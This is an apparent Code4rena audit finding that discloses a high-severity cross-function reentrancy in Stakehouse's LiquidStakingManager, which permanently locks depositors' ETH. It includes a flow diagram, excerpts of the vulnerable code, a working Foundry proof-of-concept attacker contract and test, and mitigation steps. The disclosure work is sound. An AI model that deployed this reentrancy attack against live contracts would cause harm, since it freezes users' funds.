## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-11

# [Protocol insolvent - Permanent freeze of funds](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524


# Vulnerability details

## Impact

* Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users.
* Protocol's LifecycleStatus state machine is broken 

Other impacts:
* Users deposit funds to an unstakable validator (node runner has already took out his funds)

Impact is also on the Giant Pools that give liquidity to the vaults.

A competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse.
## Proof of Concept

There are two main bugs that cause the above impact:
1. Reentrancy bug in `withdrawETHForKnot` function in `LiquidStakingManager.sol`
2. Improper balance check in `LiquidStakingManager.sol` for deposited node runner funds. 

For easier reading and understanding, please follow the bellow full attack flow diagram when reading through the explanation.
```
┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐
│           │               │           │            │           │              │           │
│Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   │
│           │               │           │            │           │              │           │
└─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘
      │                           │                        │                          │
      │   Register BLS Key #1     │                        │                          │
      ├──────────────────────────►│                        │                          │
      │                           │                        │                          │
      │   Register BLS Key #1     │                        │                          │
      ├──────────────────────────►│                        │Deposit 24 ETH to savETH  │
      │                           │                        │◄─────────────────────────┤
      │                           │                        │                          │
      │                           │                        │Deposit 4 ETH to mevAndFees
      │                           │                        │◄─────────────────────────┐
      │WithdrawETHForKnot BLS #1  │                        │                          │
      ├──────────────────────────►│                        │                          │
      │       Send 4 ETH          │                        │                          │
      │◄──────────────────────────┤                        │                          │
      │ Reenter stake function    │                        │                          │
      ├──────────────────────────►│Get 28 ETH from vaults  │                          │
      │                           ├───────────────────────►│                          │
      │ ┌───────────────────────┐ │     Send 28 ETH        │                          │
      │ │ Stake complete.       │ │◄───────────────────────┤                          │
      │ │status=DEPOSIT_COMPLETE│ │                        │                          │
      │ └───────────────────────┘ │                        │                          │
      │Finished WithdrawETHForKnot│                        │                          │
      │◄──────────────────────────┤                        │Users cannot mint derivati│es
      │                           │                        │◄─────────────────────────┤
      │    ┌──────────────────┐   │                        │Users cannot burnLPTokens │
      │    │BLS Key #1 banned │   │                        │◄─────────────────────────┤
      │    └──────────────────┘   │                        │Users cannot rotateTokens │
      │                           │                        │◄─────────────────────────┤
      │                           │                        │                          │
```

Lets assume the following starting point:
1. Node runner registered and paid 4 ETH for BLS KEY #1
2. Node runner registered and paid 4 ETH for BLS KEY #2
3. savETH users collected 24 ETH ready for staking
4. mevAndFess users collected 4 ETH ready for staking


**Reentrancy in `withdrawETHForKnot`**:

`withdrawETHForKnot` is a function used in `LiquidStakingManager`. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.

`withdrawETHForKnot`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326
```
    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {
....
        IOwnableSmartWallet(associatedSmartWallet).rawExecute(
            _recipient,
            "",
            4 ether
        );
....
        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;
    }
```

The associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance). 

Please note:
1.  The Node Runner can reenter the `LiquidStakingManager` when receiving the 4 ETH
2. `bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;` is only executed after the reentrancy

We can call any method we need with the following states:
* BLS key is NOT banned
* Status is `IDataStructures.LifecycleStatus.INITIALS_REGISTERED`

The node runner will call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`

`stake`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524

```
    function stake(
        bytes[] calldata _blsPublicKeyOfKnots,
        bytes[] calldata _ciphertexts,
        bytes[] calldata _aesEncryptorKeys,
        IDataStructures.EIP712Signature[] calldata _encryptionSignatures,
        bytes32[] calldata _dataRoots
    ) external {
....
            // check if BLS public key is registered with liquid staking derivative network and not banned
            require(isBLSPublicKeyBanned(blsPubKey) == false, "BLS public key is banned or not a part of LSD network");
....
            require(
                getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
                "Initials not registered"
            );
....
            _assertEtherIsReadyForValidatorStaking(blsPubKey);

            _stake(
                _blsPublicKeyOfKnots[i],
                _ciphertexts[i],
                _aesEncryptorKeys[i],
                _encryptionSignatures[i],
                _dataRoots[i]
            );
....
    }
```

The `stake` function checks 
1. That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy
2. IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is. 
3. There is enough balance in the vaults and node runners smart wallet in `_assertEtherIsReadyForValidatorStaking`

`_assertEtherIsReadyForValidatorStaking`  checks that the node runners smart wallet has more than 4 ETH. 
Because our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass. 

`_assertEtherIsReadyForValidatorStaking`
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934
```
    function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {
        address associatedSmartWallet = smartWalletOfKnot[blsPubKey];
        require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");

        LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);
        require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");
        require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");

        LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);
        require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");
        require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault");
    }
```

Since we can pass all checks. `_stake` will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the `TransactionRouter` with 32 ETH needed for the stake. The `TransactionRouter` will process the funds and stake them. The `LifecycleStatus` will be updated to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`

`_stake`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739
```
    function _stake(
        bytes calldata _blsPublicKey,
        bytes calldata _cipherText,
        bytes calldata _aesEncryptorKey,
        IDataStructures.EIP712Signature calldata _encryptionSignature,
        bytes32 dataRoot
    ) internal {
        address smartWallet = smartWalletOfKnot[_blsPublicKey];

        // send 24 ether from savETH vault to smart wallet
        savETHVault.withdrawETHForStaking(smartWallet, 24 ether);

        // send 4 ether from DAO staking funds vault
        stakingFundsVault.withdrawETH(smartWallet, 4 ether);

        // interact with transaction router using smart wallet to deposit 32 ETH
        IOwnableSmartWallet(smartWallet).execute(
            address(getTransactionRouter()),
            abi.encodeWithSelector(
                ITransactionRouter.registerValidator.selector,
                smartWallet,
                _blsPublicKey,
                _cipherText,
                _aesEncryptorKey,
                _encryptionSignature,
                dataRoot
            ),
            32 ether
        );
....
    }
```

After `_stake` and `stake` will finish executing we will finish the Cross-Function Reentrancy. 

The protocol has entered the following state for the BLS key #1:
1. BLS Key #1 is banned
2. LifecycleStatus is `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`

In such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:

`mintDerivatives`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577
```
    function mintDerivatives(
        bytes[] calldata _blsPublicKeyOfKnots,
        IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,
        IDataStructures.EIP712Signature[] calldata _reportSignatures
    ) external {
....
            // check if BLS public key is registered and not banned
            require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, "BLS public key is banned or not a part of LSD network");
....
```

Vault LP Tokens cannot be burned for withdraws because that is not supported in DEPOSIT_COMPLETE state:

`burnLPToken`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126
```
    function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {
...
        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];
        IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);

        require(
            validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||
            validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,
            "Cannot burn LP tokens"
        );
....
```

Tokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state 

`rotateLPTokens`
```
    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {
...
        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];
...
        require(
            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Lifecycle status must be one"
        );
...
```

Funds are stuck, they cannot be taken or used. 
The LifecycleStatus is also stuck, tokens cannot be minted. 

### Foundry POC:

The POC will showcase the scenario in the diagram.

Add the following contracts to `liquid-staking` folder:
https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking
```
// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

import { LiquidStakingManager } from "../../liquid-staking/LiquidStakingManager.sol";
import { TestUtils } from "../../../test/utils/TestUtils.sol";

contract NodeRunner {
    bytes blsPublicKey1;
    LiquidStakingManager manager;
    TestUtils testUtils;

    constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {
        manager = _manager;
        blsPublicKey1 = _blsPublicKey1;
        testUtils = TestUtils(_testUtils);
        //register BLS Key #1
        manager.registerBLSPublicKeys{ value: 4 ether }(
            testUtils.getBytesArrayFromBytes(blsPublicKey1),
            testUtils.getBytesArrayFromBytes(blsPublicKey1),
            address(0xdeadbeef)
        );
        // Register BLS Key #2
        manager.registerBLSPublicKeys{ value: 4 ether }(
            testUtils.getBytesArrayFromBytes(_blsPublicKey2),
            testUtils.getBytesArrayFromBytes(_blsPublicKey2),
            address(0xdeadbeef)
        );
    }
    receive() external payable {
        testUtils.stakeSingleBlsPubKey(blsPublicKey1);
    }
}
```

Add the following imports to `LiquidStakingManager.t.sol`
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12
```
import { NodeRunner } from "../../contracts/testing/liquid-staking/NodeRunner.sol";
import { IDataStructures } from "@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol";
```

Add the following test to `LiquidStakingManager.t.sol`
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121
```
    function testLockStakersFunds() public {
        uint256 startAmount = 8 ether;
        // Create NodeRunner. Constructor registers two BLS Keys
        address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));
        
        // Simulate state transitions in lifecycle status to initials registered (value of 1)
        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);

        // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1
        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);
        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);
        
        // deposit savETHUser, feesAndMevUser funds for validator #1
        depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);
        depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);

        // withdraw ETH for first BLS key and reenter
        // This will perform a cross-function reentracy to call stake
        vm.startPrank(nodeRunner);
        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);
        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)
        // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE 
        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);
        vm.stopPrank();
        
        // Validate mintDerivatives reverts because of banned public key 
        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();
        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();
        vm.expectRevert("BLS public key is banned or not a part of LSD network");
        manager.mintDerivatives(
            getBytesArrayFromBytes(blsPubKeyOne),
            reports,
            sigs
        );

        // Validate depositor cannot burn LP tokens
        vm.startPrank(savETHUser);
        vm.expectRevert("Cannot burn LP tokens");
        savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));
        vm.stopPrank();
    }

```

To run the POC execute: `yarn test -m testLockStakersFunds -v `

Expected output:
```
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testLockStakersFunds() (gas: 1731537)
Test result: ok. 1 passed; 0 failed; finished in 8.21ms
```

To see the full trace, execute: `yarn test -m testLockStakersFunds -vvvv`
## Tools Used

VS Code, Foundry

## Recommended Mitigation Steps

1. Add a reentrancy guard to `withdrawETHForKnot` and `stake`
2. Keep proper accounting for ETH deposited by node runner for each BLS key
